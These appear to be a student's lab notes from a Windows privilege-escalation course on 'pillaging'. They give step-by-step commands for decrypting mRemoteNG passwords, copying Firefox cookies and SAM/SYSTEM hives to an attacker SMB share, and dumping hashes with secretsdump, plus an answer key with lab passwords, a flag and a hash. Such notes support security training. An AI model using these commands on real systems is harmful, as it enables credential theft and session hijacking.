# NOTE — Pillaging

## ID
2600

## Module
Windows Privilege Escalation

## Kind
notes

## Title
Section 26 — Pillaging

## Description
Covers post-exploitation data harvesting from installed applications — decrypting mRemoteNG saved credentials, stealing browser cookies for session hijacking, and restoring restic backup snapshots to extract SAM/SYSTEM hives for offline hash dumping with secretsdump.

## Tags
pillaging, mremoteng, cookies, restic, secretsdump, credential-theft

## Commands
- `cmd /c more "%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml"`
- `python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD>"`
- `python3 cookieextractor.py --dbpath cookies.sqlite --host <DOMAIN>`
- `restic.exe -r <REPO_PATH> snapshots`
- `restic.exe -r <REPO_PATH> restore <SNAPSHOT_ID> --target <RESTORE_PATH>`
- `impacket-secretsdump -sam SAM -system SYSTEM local`

## What This Section Covers
After gaining access to a host, pillaging involves harvesting credentials and sensitive data from installed applications, browser stores, and backup systems. This section covers three key pillaging vectors: extracting and decrypting stored credentials from mRemoteNG (a remote connection manager), stealing Firefox cookies for session hijacking into web applications, and restoring restic backup snapshots that contain SAM/SYSTEM registry hives for offline password hash extraction.

## Methodology
1. **Enumerate installed applications**: Check `C:\Program Files\` and `C:\Program Files (x86)\` for remote management tools (mRemoteNG, PuTTY, WinSCP, FileZilla, etc.) that store credentials.
2. **mRemoteNG credential extraction**: The config file lives at `%USERPROFILE%\AppData\Roaming\mRemoteNG\confCons.xml`. It contains AES-GCM encrypted passwords. Extract the `Password=` attribute and decrypt with `mremoteng_decrypt.py` from GitHub (haseebT/mRemoteNG-Decrypt). Default encryption uses a known master password — if a custom master password was set, you'd need to crack or find it first.
3. **Browser cookie theft**: Copy the Firefox `cookies.sqlite` from `%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\cookies.sqlite` to your attack box via SMB. Use `cookieextractor.py` to extract cookies for a target domain. Inject the cookie value using a browser extension like Cookie-Editor, then refresh the page to hijack the session.
4. **Restic backup restoration**: If restic is installed, look for backup configuration files (repository path and password). List available snapshots with `restic.exe -r <REPO> snapshots`. Restore snapshots containing `C:\Windows\System32\config` to get SAM/SYSTEM hives. Copy them to your attack box and run `impacket-secretsdump -sam SAM -system SYSTEM local` to dump all local account hashes.

## Multi-step Workflow (optional)
```
# --- mRemoteNG credential extraction ---
# On target:
cmd /c more "%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml"
# Copy the Password= value

# On attack box:
wget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py
python3 mremoteng_decrypt.py -s "<ENCRYPTED_PASSWORD_BASE64>"

# --- Cookie theft workflow ---
# On attack box:
sudo impacket-smbserver share ./ -smb2support

# On target (cmd):
copy C:\Users\<USER>\AppData\Roaming\Mozilla\Firefox\Profiles\<PROFILE>\cookies.sqlite \\<ATTACKER_IP>\share

# On attack box:
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
python3 cookieextractor.py --dbpath cookies.sqlite --host <TARGET_DOMAIN>
# Inject extracted cookie value via Cookie-Editor in browser

# --- Restic backup → SAM dump ---
# On target (PowerShell):
restic.exe -r E:\restic snapshots
# Identify snapshot with C:\Windows\System32\config
restic.exe -r E:\restic restore <SNAPSHOT_ID> --target C:\Users\<USER>\Restore

# Copy SAM and SYSTEM to attack box:
copy C:\Users\<USER>\Restore\C\Windows\System32\config\SAM \\<ATTACKER_IP>\share\
copy C:\Users\<USER>\Restore\C\Windows\System32\config\SYSTEM \\<ATTACKER_IP>\share\

# On attack box:
impacket-secretsdump -sam SAM -system SYSTEM local
```

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Application installed to manage remote systems? | mRemoteNG | `dir 'C:\Program Files (x86)\'` as Peter |
| Q2: Password for Grace's local account? | Princess01! | Extracted encrypted password from `confCons.xml`, decrypted with `mremoteng_decrypt.py` |
| Q3: Use cookies to login to slacktestapp.com, get flag | HTB{Stealing_Cookies_To_AccessWebSites} | Copied `cookies.sqlite` via SMB, extracted cookie with `cookieextractor.py`, injected into Firefox with Cookie-Editor |
| Q4: Password for restic backups? | Superbackup! | Found in `backup conf.txt` on Jeff's Desktop (Jeff creds `jeff:Webmaster001!` found on the slacktestapp page after cookie hijack) |
| Q5: Administrator hash from restored backup? | bac9dc5b7b4bec1d83e0e9c04b477f26 | Restored snapshot `b2f5caa0` containing `C:\Windows\System32\config`, copied SAM+SYSTEM to attack box, ran `impacket-secretsdump` |

## Key Takeaways
- mRemoteNG stores credentials in `confCons.xml` using AES-GCM encryption with a default master password. If the user didn't set a custom master password, decryption is trivial with publicly available tools.
- Always check for remote management tools (mRemoteNG, WinSCP, PuTTY, FileZilla, RDCMan) — they almost always store credentials, often poorly protected.
- Cookie theft enables **session hijacking without knowing the password**. Firefox stores cookies in a SQLite database that's readable by the logged-in user. Chrome and Edge use DPAPI-encrypted cookies, which require additional steps.
- Restic is a legitimate backup tool, but if you find the repository path and password, you can restore any snapshot — including ones containing SAM/SYSTEM hives from `C:\Windows\System32\config`. Always look for backup configuration files on disk.
- `impacket-secretsdump` with `-sam` and `-system` flags works entirely offline — you extract the hives and dump locally. No need for admin access on the live target.
- The lab has a chain: Peter → mRemoteNG → Grace creds → cookie theft → Jeff creds → restic backups → Administrator hash. Real-world pillaging often involves this kind of credential chaining.

## Gotchas
- mRemoteNG config path is **per-user** under `%USERPROFILE%\AppData\Roaming\` — you need to check the config for each user profile you can access.
- Firefox profile directory names are randomized (e.g., `wu7k463d.default-release`) — enumerate them with `dir %USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\`.
- When restoring restic snapshots, the restore path recreates the original directory structure inside the target directory (e.g., restoring to `C:\Users\jeff\Restore` creates `C:\Users\jeff\Restore\C\Windows\System32\config\SAM`). Don't look in the wrong place.
- You need **both** SAM and SYSTEM files for secretsdump — SYSTEM contains the boot key needed to decrypt the SAM hashes.
- For the cookie injection to work, the cookie domain must match exactly. Use Cookie-Editor to set the domain to `.api.slacktestapp.com` and the cookie name to `d`.
